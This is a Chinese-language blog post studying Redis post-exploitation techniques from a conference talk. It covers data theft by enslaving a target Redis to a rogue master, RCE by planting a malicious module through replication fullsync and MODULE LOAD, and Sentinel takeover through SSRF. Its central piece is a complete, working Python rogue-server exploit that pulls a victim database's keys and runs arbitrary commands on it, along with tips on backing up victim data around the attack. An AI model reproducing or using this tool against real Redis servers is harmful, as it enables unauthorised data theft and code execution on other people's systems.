---
title: redis-post-exploitation 学习
date: 2019-07-14 12:00:00
tags:
---


### redis-post-exploitation 学习

[2019-07-14](/2019/07/14/redis-post-exploitation-学习/)

[](#简介 "简介")简介
--------------

前两天Redis通过加载扩展实现RCE的方法突然火了起来,自己就去读了下原文ppt,发现里面不止写了RCE的利用,还附带了一些其他的就学习了一下。

[](#Data-Retrieval "Data Retrieval")Data Retrieval
--------------------------------------------------

该利用实现方法为将目标Redis设置为Rogue的slave数据库,通过rogue向slave发送命令获取数据。这个主要存在几个问题, 一是当目标Redis被设置为一台新redis的slave后会自动进行fullsync,导致目标Redis的原数据被清除。二是master如何给slave发命令, 查了下文档并没有找到主动发命令的方法。三是,slave的数据如何返回到master中。  
第一个问题比较好解决,自己搭建Rogue后只要slave发送sync请求时返回CONTINUE即可实现不清空slave的数据。

1  
2  
3  

elif cmd\_arr\[0\].startswith("PSYNC") or cmd\_arr\[0\].startswith("SYNC"):  
 resp = "+CONTINUE " + "Z" \* 40 + " 0" + CLRF  
 phase = 3  

第二个问题,文档里没有翻到master给slave发命令的指令, 但是在同步完成后master是可以给slave返回命令执行的。

1  
2  
3  
4  
5  
6  
7  
8  
9  
10  
11  
12  
13  
14  
15  
16  
17  
18  
19  

 if ((replication\_cron\_loops % server.repl\_ping\_slave\_period) == 0 &&  
 listLength(server.slaves))  
{  
 /\* Note that we don't send the PING if the clients are paused during  
 \* a Redis Cluster manual failover: the PING we send will otherwise  
 \* alter the replication offsets of master and slave, and will no longer  
 \* match the one stored into 'mf\_master\_offset' state. \*/  
 int manual\_failover\_in\_progress =  
 server.cluster\_enabled &&  
 server.cluster->mf\_end &&  
 clientsArePaused();  
  
 if (!manual\_failover\_in\_progress) {  
 ping\_argv\[0\] = createStringObject("PING",4);  
 replicationFeedSlaves(server.slaves, server.slaveseldb,  
 ping\_argv, 1);  
 decrRefCount(ping\_argv\[0\]);  
 }  
}  

从代码里看出,在同步完成后写死了只会返回PING,所以这里自己搭建Rogue返回任意指令即可。  
第三个问题,在开启调试模式之后会返回数据到Master中, 所以按照PPT里的流程编写Rogue即可。

![-w1067](https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_1.jpg)

1  
2  
3  
4  
5  
6  
7  
8  
9  
10  
11  
12  
13  
14  
15  
16  
17  
18  
19  
20  
21  
22  
23  
24  
25  
26  
27  
28  
29  
30  
31  
32  
33  
34  
35  
36  
37  
38  
39  
40  
41  
42  
43  
44  
45  
46  
47  
48  
49  
50  
51  
52  
53  
54  
55  
56  
57  
58  
59  
60  
61  
62  
63  
64  
65  
66  
67  
68  
69  
70  
71  
72  
73  
74  
75  
76  
77  
78  
79  
80  
81  
82  
83  
84  
85  
86  
87  
88  
89  
90  
91  
92  
93  
94  
95  
96  
97  
98  
99  
100  
101  
102  
103  
104  
105  
106  
107  
108  
109  
110  
111  
112  
113  
114  
115  
116  
117  
118  
119  
120  
121  
122  
123  
124  
125  
126  

import socket  
import time  
  
CLRF = "\\r\\n"  
  
def din(sock, cnt=4096):  
 global verbose  
 msg = sock.recv(cnt)  
  
 return msg.decode('gb18030')  
  
def dout(sock, msg):  
 global verbose  
 if type(msg) != bytes:  
 msg = msg.encode()  
 sock.send(msg)  
  
def encode\_cmd\_arr(arr):  
 cmd = ""  
 cmd += "\*" + str(len(arr))  
 for arg in arr:  
 cmd += CLRF + "$" + str(len(arg))  
 cmd += CLRF + arg  
 cmd += "\\r\\n"  
 return cmd  
  
def encode\_cmd(raw\_cmd):  
 return encode\_cmd\_arr(raw\_cmd.split(" "))  
  
def decode\_cmd(cmd):  
 if cmd.startswith("\*"):  
 raw\_arr = cmd.strip().split("\\r\\n")  
 return raw\_arr\[2::2\]  
 if cmd.startswith("$"):  
 return cmd.split("\\r\\n", 2)\[1\]  
 return cmd.strip().split(" ")  
  
class Remote:  
 def \_\_init\_\_(self, rhost, rport):  
 self.\_host = rhost  
 self.\_port = rport  
 self.\_sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)  
 self.\_sock.connect((self.\_host, self.\_port))  
  
 def send(self, msg):  
 dout(self.\_sock, msg)  
  
 def recv(self, cnt=65535):  
 return din(self.\_sock, cnt)  
  
 def do(self, cmd):  
 self.send(encode\_cmd(cmd))  
 buf = self.recv()  
 return buf  
  
class RogueServer:  
 def \_\_init\_\_(self, lhost, lport):  
 self.\_host = lhost  
 self.\_port = lport  
 self.\_sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)  
 self.\_sock.bind(('0.0.0.0', self.\_port))  
 self.\_sock.listen(10)  
 self.i = 0  
  
 def close(self):  
 self.\_sock.close()  
  
 def handle(self, data):  
 cmd\_arr = decode\_cmd(data)  
 resp = ""  
 phase = 0  
 \# print(data)  
 if cmd\_arr\[0\].startswith("PING"):  
 resp = "+PONG" + CLRF  
 phase = 1  
 elif 'ACK' in data:  
 if self.i % 3 == 0:  
 payload = "SCRIPT DEBUG SYNC"  
 resp = encode\_cmd(payload)  
 elif self.i % 3 == 1:  
 payload = "eval redis.breakpoint() 0"  
 resp = encode\_cmd(payload)  
 phase = 4  
 else:  
 payload = "r keys \*"  
 resp = encode\_cmd(payload)  
 self.i += 1  
  
 elif cmd\_arr\[0\].startswith("REPLCONF"):  
 resp = "+OK" + CLRF  
 phase = 2  
 elif cmd\_arr\[0\].startswith("PSYNC") or cmd\_arr\[0\].startswith("SYNC"):  
 resp = "+CONTINUE " + "Z" \* 40 + " 0" + CLRF  
 phase = 3  
 return resp, phase  
  
 def exp(self):  
 cli, addr = self.\_sock.accept()  
 while True:  
 data = din(cli, 1024)  
 if len(data) == 0:  
 print("data == 0")  
 break  
 resp, phase = self.handle(data)  
  
 if phase == 4:  
 dout(cli, resp)  
 data = din(cli, 1024)  
 \# payload = raw\_input("Commands:")  
  
 payload = "r keys \*"  
 while True:  
 time.sleep(1)  
 payload = input("\[\*\]Master to Slave Command:")  
 if payload == 'exit':  
 break  
 resp = encode\_cmd(payload)  
 dout(cli, resp)  
 data = din(cli, 1024)  
 print(data)  
 break  
 else:  
 dout(cli, resp)  
  
  
RogueServer("127.0.0.1", 9990).exp()  

该方法在redis bind到127,SSRF且无回显的场景中可以快速拿到数据库中的所有数据.  
Docker中的redis bind到127进行测试.  
![-w1238](https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_2.jpg)

P.S.  
PPT中提到的redis5版本后不能使用config命令, 说的是在script模式中不能使用config,正常模式下能够正常使用,看到有不少人理解错了顺便说一下。  
![-w1201](https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_3.jpg)

[](#RCE "RCE")RCE
-----------------

redis4中新增了添加扩展功能,可以自己编译so load到redis中使用。如果能够上传编译好的so到redis服务器中,即可通过module load加载扩展实现RCE。在以前的利用中，是通过持久化数据到crontab或authorized\_keys或web目录中,但是这种方法有很大的一个问题是我们不能完全控制文件内容。  
Redis在进行fullsync时, 会把master返回的数据直接保存到临时文件中,然后再重命名为dbfilename对应的文件名, 这里自己自己搭建rogue server,即可返回任意内容实现任意文件上传,然后写入so即可实现RCE。

1  
2  
3  
4  
5  

if (rename(server.repl\_transfer\_tmpfile,server.rdb\_filename) == \-1) {  
 serverLog(LL\_WARNING,"Failed trying to rename the temp DB into dump.rdb in MASTER <-> SLAVE synchronization: %s", strerror(errno));  
 cancelReplicationHandshake();  
 return;  
}  

![-w1185](https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_4.jpg)  
在redis4中, fullsync使用的协议格式为plaintext,而redis5中使用了custom格式。一开始有开源的rogue server直接使用data.startswith(“PSYNC”)来决定返回内容,我测试该脚本能在redis4成功而redis5失败,就是这个原因。

在进行FULLSYNC时, slave的数据会被完全清空且同步master的数据, 所以在利用时需要做好数据备份。  
数据备份有两种常用的方法, 一是在利用前先save,在RCE后重启redis即可。二是创建一个公网redis,利用前将目标数据同步到公网redis中,利用完后目标REDIS再从公网redis中同步数据,这样不需要重启。

[](#redis-sentinel "redis-sentinel")redis-sentinel
--------------------------------------------------

Sentinel常用来管理多个Redis服务器, 该服务的默认端口为26379, 并且sentinel中不会检测包中是否含有HOST:和POST,所以可以在SSRF中利用。  
ppt中提到的利用方法为,首先在sentinel中监控大Rogue server, Rogue server中含有两个slave一个为另外的小Rogue server另一个为需要take over的redis。当大Rogue server断线时, Sentinel会从slave中按照slave\_priorty等配置来选举出新的master。  
当小Rogue server成为Master,目标Redis成为了slave后就可以接着使用之前的方法实现RCE。  
当前还提到了一种更简单的利用方法,当Sentinel存在未授权时，可以使用Sentinel的Notification功能执行任意脚本。不过我测试redis-sentinel默认配置为sentinel deny-scripts-reconfig yes,没法利用。

[](#References "References")References
--------------------------------------

[https://github.com/Ridter/redis-rce](https://github.com/Ridter/redis-rce)  
[https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)  
[https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)


